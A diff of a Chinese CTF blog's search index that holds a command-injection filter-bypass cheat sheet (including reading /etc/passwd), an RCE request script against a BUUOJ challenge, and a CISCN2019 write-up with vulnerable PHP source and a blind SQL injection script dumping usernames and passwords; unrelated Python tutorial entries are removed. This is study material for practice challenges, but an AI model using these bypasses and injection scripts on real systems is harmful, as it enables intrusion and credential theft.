     <content><![CDATA[<h2 id="命令注入知识点总结"><a href="#命令注入知识点总结" class="headerlink" title="命令注入知识点总结"></a>命令注入知识点总结</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、%20(space)、%09(tab)、$IFS<span class="variable">$9</span>、 IFS、IFS</span><br><span class="line">2、使用&lt;或者&lt;&gt;来绕过空格 cat&lt;a.txt</span><br><span class="line">3、花括号扩展&#123;OS_COMMAND,ARGUMENT&#125; &#123;cat,/etc/passwd&#125;</span><br><span class="line">4、<span class="variable">$IFS</span> 空格绕过 cat<span class="variable">$IFSa</span>.txt</span><br><span class="line">5、变量控制 X=$<span class="string">&#x27;cat\x09./flag.php</span></span><br></pre></td></tr></table></figure>
 <h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、使用空变量 使用$*和<span class="variable">$@</span>，<span class="variable">$x</span>(x 代表 1-9),<span class="variable">$&#123;x&#125;</span>(x&gt;=10)(我尝试小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 ca<span class="variable">$&#123;21&#125;</span>t a.txt</span><br><span class="line">2、反斜杠 ca\t a.txt</span><br><span class="line">3、变量替换 a=ca;b=t;c=a.txt;a aab <span class="variable">$c</span></span><br><span class="line">4、引号 c<span class="string">&#x27;a&#x27;</span>t flag.php</span><br><span class="line">5、编码绕过</span><br><span class="line">    Base64 编码绕过：</span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;cat a.txt&#x27;| base64 Y2F0IGEudHh0Cg==</span></span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;Y2F0IGEudHh0Cg==&#x27; | base64 -d abc</span></span><br><span class="line">    十六进制编码绕过：</span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;cat a.txt&#x27; | xxd -p 63617420612e7478740a</span></span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;0x63617420612e7478740a&#x27;| xxd -r -p Abc</span></span><br><span class="line">6、通配符 ？*</span><br><span class="line">    […]：匹配范围中任何一个字符 cat fl[abc]g.php</span><br><span class="line">    [a-z]：匹配 a-z 范围中任何一个字符 cat fl[a-z]g.php</span><br><span class="line">    &#123;a,b&#125;：对以逗号分割的文件列表进行拓展 cat fl&#123;b,c&#125;g.php</span><br></pre></td></tr></table></figure>
 <h3 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">例：command1 &amp; command2    先执行command2后执行command1</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">例：command1 &amp;&amp; command2   先执行command1后执行command2</span><br><span class="line">3.|</span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">例：command1 | command2     只执行command2</span><br><span class="line">4.||</span><br><span class="line">只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">例：7 || ls /</span><br><span class="line">5.；</span><br><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">例：ping 127.0.0.1;ls /</span><br></pre></td></tr></table></figure>
@@ -532,7 +452,7 @@
 <p><a href="https://blog.csdn.net/u014549283/article/details/81783164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161690037516780357237205%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161690037516780357237205&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81783164.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/u014549283/article/details/81783164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161690037516780357237205%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161690037516780357237205&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81783164.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187</a></p>
 ]]></content>
       <categories>
-        <category>Web学习</category>
+        <category>Web</category>
       </categories>
       <tags>
         <tag>CTF</tag>
@@ -540,141 +460,8 @@
       </tags>
   </entry>
   <entry>
-    <title>python列表的运用</title>
-    <url>/2021/02/01/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/python%E5%88%97%E8%A1%A8%E7%9A%84%E8%BF%90%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="python列表的运用"><a href="#python列表的运用" class="headerlink" title="python列表的运用"></a>python列表的运用</h2><p>列表是python中内置的序列类型，与C语言中的数组有些类似，但实际上python中的列表更像是一种类，其中封装了许多种方法。</p>
-<a id="more"></a>
-
-<h3 id="1、如何定义一个列表list"><a href="#1、如何定义一个列表list" class="headerlink" title="1、如何定义一个列表list"></a>1、如何定义一个列表list</h3><p>这是最简单的列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201113758182.png"></p>
-<p>还可以数字与字符串混搭</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list2 = [<span class="number">1</span>, <span class="string">&#x27;red&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="number">3</span>, <span class="string">&#x27;yellow&#x27;</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201113806526.png"></p>
-<p>甚至可以在列表里加入列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list3 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/e6a1a8840f884dd719dc49cd2ac0aa2f.png"></p>
-<h3 id="2、列表的使用方法"><a href="#2、列表的使用方法" class="headerlink" title="2、列表的使用方法"></a>2、列表的使用方法</h3><h4 id="1、删除列表元素"><a href="#1、删除列表元素" class="headerlink" title="1、删除列表元素"></a>1、删除列表元素</h4><p>我们可以通过del语句来删除列表中的元素</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> list1[<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/cffcf388ca09f9c1152bed3187aca396.png"></p>
-<p>tips:学过c语言的数组，我们都知道<strong>数组</strong>的下标是从0开始的，同样python中的<strong>列表</strong>也不例外，所以</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> list1[<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
-<p>删除的是下标为4的元素</p>
-<h4 id="2、列表脚本操作符"><a href="#2、列表脚本操作符" class="headerlink" title="2、列表脚本操作符"></a>2、列表脚本操作符</h4><h5 id="1、长度操作"><a href="#1、长度操作" class="headerlink" title="1、长度操作"></a>1、长度操作</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(list1)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/b873434af888df2abe5f73ff6be3d7ca.png"></p>
-<h5 id="2、组合操作符"><a href="#2、组合操作符" class="headerlink" title="2、组合操作符"></a>2、组合操作符</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 + [<span class="number">5</span>] 或 [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>] + [<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2021020111382871.png"></p>
-<h5 id="3、重复操作符"><a href="#3、重复操作符" class="headerlink" title="3、重复操作符"></a>3、重复操作符</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 * <span class="number">4</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/9129a2667adb0aa5630a45ee35d15996.png"></p>
-<h5 id="4、内置迭代器"><a href="#4、内置迭代器" class="headerlink" title="4、内置迭代器"></a>4、内置迭代器</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> list1: print(x, end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0592770187d406e3d1a9a72037366032.png"></p>
-<h5 id="5、判断元素是否存在于表中"><a href="#5、判断元素是否存在于表中" class="headerlink" title="5、判断元素是否存在于表中"></a>5、判断元素是否存在于表中</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> <span class="keyword">in</span> list1</span><br><span class="line"><span class="number">5</span> <span class="keyword">not</span> <span class="keyword">in</span> list1</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201113843302.png"></p>
-<p>tips：从这看，python这也太人性化了w(ﾟДﾟ)w</p>
-<h4 id="3、列表的截取取与拼接"><a href="#3、列表的截取取与拼接" class="headerlink" title="3、列表的截取取与拼接"></a>3、列表的截取取与拼接</h4><h5 id="1、列表的截取"><a href="#1、列表的截取" class="headerlink" title="1、列表的截取"></a>1、列表的截取</h5><p>tips: python中的列表可以正向索引也可以反向索引。</p>
-<p><strong>正向索引</strong><br><img src="https://img-blog.csdnimg.cn/20210201113855754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<p><strong>反向索引</strong><br><img src="https://img-blog.csdnimg.cn/20210201113931263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<p>所以，截取可以正向截取</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201113951193.png"></p>
-<p>可以反向截取</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/4887372c3996635cf4fd627a88de57eb.png"></p>
-<p>还可以有范围的截取</p>
-<p>tips：该范围为左闭右开区间</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">1</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/7982975c1bcdcdc415a99e2248bec225.png"></p>
-<p>甚至可以不加前后范围</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">1</span>:]</span><br><span class="line">list1[:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201114021435.png"></p>
-<h5 id="2、列表的拼接"><a href="#2、列表的拼接" class="headerlink" title="2、列表的拼接"></a>2、列表的拼接</h5><p>列表里还支持拼接操作</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 += [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201114052460.png"></p>
-<h4 id="4、列表函数"><a href="#4、列表函数" class="headerlink" title="4、列表函数"></a>4、列表函数</h4><h5 id="1、max"><a href="#1、max" class="headerlink" title="1、max()"></a>1、max()</h5><p>返回列表元素最大值</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">max</span>(list1)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/4b557e1d41910ac90d7efc4d1a6ea605.png"></p>
-<h5 id="2、min"><a href="#2、min" class="headerlink" title="2、min()"></a>2、min()</h5><p>返回列表元素最小值</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">min</span>(list1)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/2b6e28cd5ccfaae5831f03044016f828.png"></p>
-<h4 id="5、列表方法"><a href="#5、列表方法" class="headerlink" title="5、列表方法"></a>5、列表方法</h4><h5 id="1、list-append-obj"><a href="#1、list-append-obj" class="headerlink" title="1、list.append(obj)"></a>1、list.append(obj)</h5><p>在列表末尾添加新的对象</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.append(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/197986f29839747d215d40de04b8e512.png"></p>
-<h5 id="2、list-count-obj"><a href="#2、list-count-obj" class="headerlink" title="2、list.count(obj)"></a>2、list.count(obj)</h5><p>统计某个元素在列表中出现的次数</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.count(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/2be88d94904197ecd299d9df20189625.png"></p>
-<h5 id="3、list-extend-seq"><a href="#3、list-extend-seq" class="headerlink" title="3、list.extend(seq)"></a>3、list.extend(seq)</h5><p> 在列表末尾一次性追加另一个序列中的多个值（即用新列表扩展原来的列表）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.extend([<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>])</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/eae8df9e0c929655831788391c0340f8.png"></p>
-<h5 id="4、list-insert-index-obj"><a href="#4、list-insert-index-obj" class="headerlink" title="4、list.insert(index, obj)"></a>4、list.insert(index, obj)</h5><p>将对象插入列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.insert(<span class="number">1</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/b6b5ec0f8e1185a25d4cbacea2a1e049.png"></p>
-<h5 id="5、list-index-obj"><a href="#5、list-index-obj" class="headerlink" title="5、list.index(obj)"></a>5、list.index(obj)</h5><p>从列表中找出某个值第一个匹配项的索引位置</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.index(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/a60c93533ddf9915804d32e89c1e0ffe.png"></p>
-<p>也可以自定义范围</p>
-<p>tips：该范围为左闭右开区间</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.index(<span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/b137c26fac142e9456dc28abcf5d4539.png"></p>
-<h5 id="6、list-pop-index-1"><a href="#6、list-pop-index-1" class="headerlink" title="6、list.pop([index=-1])"></a>6、list.pop([index=-1])</h5><p>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = list1.pop()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/b462e494f7b31f2c087f2f28cba64051.png"></p>
-<h5 id="7、list-remove-obj"><a href="#7、list-remove-obj" class="headerlink" title="7、list.remove(obj)"></a>7、list.remove(obj)</h5><p>移除列表中某个值的<strong>第一个匹配项</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/75a91400ec4d101794495e08b1689516.png"></p>
-<h5 id="8、list-reverse"><a href="#8、list-reverse" class="headerlink" title="8、list.reverse()"></a>8、list.reverse()</h5><p>反向列表中的元素，但不会排序</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.reverse()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201112643577.png"></p>
-<h5 id="9、list-sort-key-None-reverse-False"><a href="#9、list-sort-key-None-reverse-False" class="headerlink" title="9、list.sort(key=None, reverse=False)"></a>9、list.sort(key=None, reverse=False)</h5><p>对原列表进行排序</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.sort()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/202102011129474.png"><br>也可以反向排序</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.sort(reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201113107565.png"></p>
-<h5 id="10、list-clear"><a href="#10、list-clear" class="headerlink" title="10、list.clear()"></a>10、list.clear()</h5><p>清空列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.clear()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201113429421.png"></p>
-<h5 id="11、list-copy"><a href="#11、list-copy" class="headerlink" title="11、list.copy()"></a>11、list.copy()</h5><p>复制列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.copy()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210201113614734.png"></p>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>面向对象思想学习</title>
-    <url>/2021/01/26/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="面向对象思想学习"><a href="#面向对象思想学习" class="headerlink" title="面向对象思想学习"></a>面向对象思想学习</h1><h2 id="面向对象主要包括七个关键词"><a href="#面向对象主要包括七个关键词" class="headerlink" title="面向对象主要包括七个关键词"></a>面向对象主要包括七个关键词</h2><p>这七个关键词为：数据、方法、对象、类、封装、继承、多态。</p>
-<a id="more"></a>
-<h3 id="1、数据"><a href="#1、数据" class="headerlink" title="1、数据"></a>1、数据</h3><p>根据百度百科得知，数据(data)是信息的<strong>表现形式</strong>和<strong>载体</strong>，是事实或观察的结果，是对客观事物的逻辑归纳，是用于表示客观事物的未经加工的原始素材。<br>例如：学生的档案信息，数字：0，1，2，3等，天气预报上的气温温度，诸如此类都可称为数据。<br>而数据进行加工后，就形成了信息。在计算机中，数据是以二进制信息单元0，1进行表示。</p>
-<h3 id="2、方法"><a href="#2、方法" class="headerlink" title="2、方法"></a>2、方法</h3><p>方法的基本解析是指为获得某种东西或达到某种目的而采取的<strong>途径</strong>，<strong>步骤</strong>和<strong>手段</strong>，而在软件编程语言中，如果将函数定义为类的一部分或者将函数与某个对象绑定，那么该函数就称之为<strong>方法</strong>。<br>方法简单来说，就是你写ACM题的时候自己写的算法，就像为了减少程序运行时间，为了防止TLE，有时候需要自己写一个快速幂函数，这就可以称作方法，为了达成某种目的而去制作能达成这个目的的方式。d=====(￣▽￣*)b</p>
-<h3 id="3、对象"><a href="#3、对象" class="headerlink" title="3、对象"></a>3、对象</h3><p>对象的基本解析是特定人或物，在计算机语言中表现为客观世界中真实存在的人或者物体，在计算机中的逻辑映射。<br>对象可以理解为，在生活中，每个人都是一个对象，每件东西也都是一个对象，可以说<strong>万物皆对象</strong>。在面向对象编程语言中，对象是系统中的基本运行实体，是代码和数据的集合。</p>
-<h3 id="4、类"><a href="#4、类" class="headerlink" title="4、类"></a>4、类</h3><p>类简单来说就是分类。在面向对象中，类是实现信息封装的基础，类是一种引用数据类型，也称类类型。每个类包含数据说明和一组操作数据的方法，而上面说的对象则是类的一种实例。<br>举个例子，人类就是一个基本的类类型，而每个人则是这个类类型的实例，也就是对象，人类这个类包含有姓名、性别、年龄等等这些<strong>数据</strong>说明，同时也有走路、吃饭、工作这些传递能量信息的<strong>方法</strong>。</p>
-<h3 id="5、封装"><a href="#5、封装" class="headerlink" title="5、封装"></a>5、封装</h3><p>封装是对某一类事物进行抽象描述。封装是个动词，通过将姓名、性别、年龄等这些属性抽象到人类这个类类型的过程就叫封装。当我们一说到人类，就能联想到这个人叫什么名字、是男是女、多大年纪等等。同时封装也能隐藏人身上的一些特殊属性，比如：这个人身上有多少钱，这是我们不可得知的。</p>
-<h3 id="6、继承"><a href="#6、继承" class="headerlink" title="6、继承"></a>6、继承</h3><p>继承就是子类继承父类的特征行为，使得子类对象（实例）具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为。同时，子类不仅可以继承父类全部的功能，还可以创建增加新数据、新功能。</p>
-<blockquote>
-<p>注意：子类继承父类的功能时，不能选择性的继承父类的部分功能，继承是类与类之间的关系，不是对象与对象之间的关系。</p>
-</blockquote>
-<p>例如：你自己，继承了你父亲的姓名，性别，年龄等这些<strong>属性</strong>，但是你在继承这些属性的同时增加了你会写代码的这么一个方法，而这个写代码的方法是你自己独有的，你的父亲并不具备这个写代码的这个功能。这就是继承。</p>
-<h3 id="7、多态"><a href="#7、多态" class="headerlink" title="7、多态"></a>7、多态</h3><p>讲多态前，需要知道接口这一知识点。<br>接口，是一种特殊的类，在这个类中指定必须做什么，但不用规定它如何去做，而多态就是以多种方式告诉这个接口类该如何去做。</p>
-<blockquote>
-<p>例如：定义一个接口类，这个类中只有一个吃饭的方法，所以我们可以知道这个类中必须要做吃饭这件事，但是吃什么，怎么吃，在哪里吃？这里就可以通过多态来实现了，我们可以再定义两个类去实现这个接口，一个类告诉它我要去中餐厅用筷子吃鱼，另一个类告诉它我要去西餐厅用刀叉吃牛排</p>
-</blockquote>
-<p>简而言之，多态就是自定义多个方法使接口类实现一件事情的达成。φ(*￣0￣)</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>面向对象其实就是环绕类进行拓展，将数据、方法封装进类中，而类又可以创建对象。多态则可以使类增加多种不同的方法，而继承可以使类在原有基础上进行扩展，使类拥有更多的属性、方法。</p>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-      </categories>
-      <tags>
-        <tag>other</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Sql-Labs</title>
-    <url>/2021/02/07/sql/sql-labs/</url>
+    <url>/2021/02/07/web%E5%AD%A6%E4%B9%A0/sql-labs/</url>
     <content><![CDATA[<p>sql-labs-less-1-10</p>
 <a id="more"></a>
 
@@ -973,10 +760,10 @@
 <p><img src="https://img-blog.csdnimg.cn/20210218194420881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
 ]]></content>
       <categories>
-        <category>sql注入</category>
+        <category>Web</category>
       </categories>
       <tags>
-        <tag>sql注入</tag>
+        <tag>sql</tag>
         <tag>sql-labs</tag>
       </tags>
   </entry>
@@ -1556,13 +1343,116 @@
 <p>所以咱们可以构造脚本进行攻击</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://be96ec7d-da8b-4fef-b553-0d08a4bca0a5.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>: payload&#125;)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
 <p>即可得到flag</p>
+<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><p>在robots.txt里发现了一个<code>*.php.bak</code>。</p>
+<p>直接下载备份文件<code>image.php.bak</code>。</p>
+<p>得到<code>image.php</code>的源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] : <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span> = addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;%00&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span> = str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;%00&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>, <span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>这里由于单引号被ban了，所以我们可以通过<code>\0</code>进行绕过。</p>
+<p>然后还有一点就是爆列名的时候由于单引号被ban掉了，所以我们可以用十六进制进行绕过。</p>
+<p>这里是payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url_here/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFlag</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    needsql = <span class="string">&quot;select group_concat(concat_ws(0x7e, username, password)) from users&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">            sql = <span class="string">f&quot;or if(ascii(substr((<span class="subst">&#123;needsql&#125;</span>),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&quot;</span></span><br><span class="line">            res = requests.get(url+sql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>((left + right - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>然后就可以爆出用户名和密码，直接登陆</p>
